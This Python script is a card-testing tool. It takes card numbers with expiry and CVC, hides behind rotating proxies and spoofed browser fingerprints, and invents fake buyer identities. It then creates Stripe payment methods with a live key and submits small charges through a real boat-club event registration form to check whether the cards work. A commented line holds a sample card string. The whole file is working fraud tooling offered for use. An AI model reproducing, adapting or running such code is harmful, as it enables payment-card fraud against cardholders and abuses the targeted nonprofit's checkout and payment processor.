import itertools
import os
import random
import re
from datetime import datetime, timedelta
from bs4 import BeautifulSoup
from faker import Faker
import requests

fake = Faker("en_US")

_proxy_pool = None


def load_proxies():
    global _proxy_pool
    file_path = "proxies.txt"

    if not os.path.exists(file_path):
        print(f"⚠️ {file_path} not found!")
        return None

    with open(file_path, "r") as f:
        raw_proxies = [line.strip() for line in f.readlines() if line.strip()]

    if not raw_proxies:
        return None

    return itertools.cycle(raw_proxies)


def get_zyte_proxy():
    global _proxy_pool

    if _proxy_pool is None:
        _proxy_pool = load_proxies()

    if _proxy_pool is None:
        return None

    try:
        chosen = next(_proxy_pool)

        parts = chosen.split(":")
        if len(parts) == 4:
            ip, port, user, pwd = parts
            proxy_url = f"http://{user}:{pwd}@{ip}:{port}"
        else:
            proxy_url = chosen

        return {"http": proxy_url, "https": proxy_url}

    except Exception as e:
        print(f"❌ Proxy Error: {e}")
        return None


def gen_random_user_agent():
    ver = random.randint(120, 131)
    windows_versions = ["10.0; Win64; x64", "11.0; Win64; x64"]
    android_versions = ["10; K", "11; SM-G973F", "12; Pixel 6", "13; SM-S901B"]

    is_mobile = random.choice([True, False])

    if is_mobile:
        android_v = random.choice(android_versions)
        ua_list = [
            f"Mozilla/5.0 (Linux; Android {android_v}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.0 Mobile Safari/537.36",
            f"Mozilla/5.0 (Linux; Android {android_v}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.0 Mobile Safari/537.36 Brave/1.68.134",
            f"Mozilla/5.0 (Linux; Android {android_v}; SAMSUNG SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/25.0 Chrome/{ver}.0.0.0 Mobile Safari/537.36",
        ]
        ua = random.choice(ua_list)
        mobile_status = "?1"
        platform = '"Android"'
    else:
        win_v = random.choice(windows_versions)
        ua_list = [
            f"Mozilla/5.0 (Windows NT {win_v}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.0 Safari/537.36",
            f"Mozilla/5.0 (Windows NT {win_v}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.0 Safari/537.36 Edg/{ver}.0.0.0",
            f"Mozilla/5.0 (Windows NT {win_v}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.0 Safari/537.36 Brave/1.68.134",
        ]
        ua = random.choice(ua_list)
        mobile_status = "?0"
        platform = '"Windows"'

    return ua, mobile_status, platform, ver


def gen_random():
    first_name = fake.first_name()
    last_name = fake.last_name()
    domains = ["@gmail.com", "@hotmail.com", "@outlook.com"]
    email = f"{first_name.lower()}{random.randint(10000, 99999)}{random.choice(domains)}"
    area_code = random.randint(200, 999)
    exchange = random.randint(200, 999)
    subscriber = random.randint(1000, 9999)
    phone = f"+1{area_code}{exchange}{subscriber}"
    street_address = fake.street_address()
    city = fake.city()
    state = fake.state_abbr()
    zipcode = fake.zipcode()
    start_date = datetime(2026, 6, 1)
    end_date = datetime(2028, 12, 31)
    delta = end_date - start_date
    random_days = random.randint(0, delta.days)
    random_date = start_date + timedelta(days=random_days)
    formatted_date = random_date.strftime("%d/%m/%y")
    return (
        first_name,
        last_name,
        email,
        phone,
        street_address,
        city,
        state,
        zipcode,
        formatted_date,
    )


def Tele1(ccx: str):
    random_amount = round(random.uniform(1.00, 1.50), 2)
    random_amount_str = f"{random_amount:.2f}"

    try:
        n, mm, yy, cvc = ccx.strip().split("|")
        if "20" in yy:
            yy = yy.split("20")[1]
    except Exception as e:
        return f"Card parsing error: {e}"
    session = requests.Session()

    # Proxy ရယူပြီး Session ထဲသို့ ထည့်သွင်းခြင်း (Request 1 အတွက် သုံးရန်)
    current_proxy = get_zyte_proxy()
    if current_proxy:
        session.proxies.update(current_proxy)

    (
        first_name,
        last_name,
        email,
        phone,
        street_address,
        city,
        state,
        zipcode,
        formatted_date,
    ) = gen_random()
    ua_string, mobile_status, platform_name, chrome_ver = (
        gen_random_user_agent()
    )

    headers = {
        'authority': 'www.heartlandclassics.org',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        'referer': 'https://www.google.com/',
        'sec-ch-ua': f'"Chromium";v="{chrome_ver}", "Not;A=Brand";v="{chrome_ver}"',
        'sec-ch-ua-mobile': mobile_status,
        'sec-ch-ua-platform': platform_name,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'cross-site',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': ua_string,
    }
    
    response = session.get(
        'https://www.heartlandclassics.org/registration-2026-beaver-lake-rendezvous/',
        headers=headers,
    )
    
    post_id = re.search(r"name='__fluent_form_embded_post_id' value='(.*?)'", response.text).group(1)
    nonce = re.search(r'name="_fluentform_29_fluentformnonce" value="(.*?)"', response.text).group(1)
    print(post_id)
    print(nonce)
    
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': f'"Chromium";v="{chrome_ver}", "Not;A=Brand";v="{chrome_ver}"',
        'sec-ch-ua-mobile': mobile_status,
        'sec-ch-ua-platform': platform_name,
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': ua_string,
    }
    
    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fce25a765c8%3B+stripe-js-v3%2Fce25a765c8%3B+card-element&key=pk_live_51NNoS4BEcKBLwoIjZDPTrmzkwu5iRqd7EtMS17wec67FgUuL1UC18FK8qj2s6c9bbN8ajfZjC3HZG2icW8zFr1Jk00RFXt9g0A'
    
    response = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    
    pm = response.json()['id']
    
    headers = {
        'authority': 'www.heartlandclassics.org',
        'accept': '*/*',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.heartlandclassics.org',
        'referer': 'https://www.heartlandclassics.org/registration-2026-beaver-lake-rendezvous/',
        'sec-ch-ua': f'"Chromium";v="{chrome_ver}", "Not;A=Brand";v="{chrome_ver}"',
        'sec-ch-ua-mobile': mobile_status,
        'sec-ch-ua-platform': platform_name,
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': ua_string,
        'x-requested-with': 'XMLHttpRequest',
    }
    
    params = {
        't': '1784328821470',
    }
    
    data = {
        'data': f'item_29__fluent_sf=&__fluent_form_embded_post_id={post_id}&_fluentform_29_fluentformnonce={nonce}&_wp_http_referer=%2Fregistration-2026-beaver-lake-rendezvous%2F&numeric_field=1&dropdown_4=0&input_text_23=&input_text_14=Yell&input_text_15=Htet&email=rodamuser01%40gmail.com&phone_2=4303000850&description_1=&description_2=&numeric_field_2=0&numeric_field_1=0&numeric_field_3=0&numeric_field_4=0&custom-payment-amount=0.50&checkbox%5B%5D=By%20checking%20this%20box%2C%20I%20hold%20free%20and%20harmless%20the%20officers%20and%20volunteers%20of%20the%20Antique%20and%20Classic%20Boat%20Society%2C%20Inc.%3B%20the%20Heartland%20Classics%20Chapter%20members%2C%20officers%20and%20directors%3B%20from%20any%20and%20all%20actions%2C%20claims%2C%20liabilities%20and%20assertion%20of%20liability%20which%20in%20any%20manner%20arises%20or%20be%20alleged%20to%20arise%20from%20all%20activities%20connected%20directly%20or%20indirectly%20with%20the%20event%20listed%20above.&payment_method=stripe&__stripe_payment_method_id={pm}',
        'action': 'fluentform_submit',
        'form_id': '29',
    }
    
    response = session.post(
        'https://www.heartlandclassics.org/wp-admin/admin-ajax.php',
        params=params,
        headers=headers,
        data=data,
    )
    
    return response.text
    
#test = "6011440260704004|05|30|605"
#print(Tele1(test))
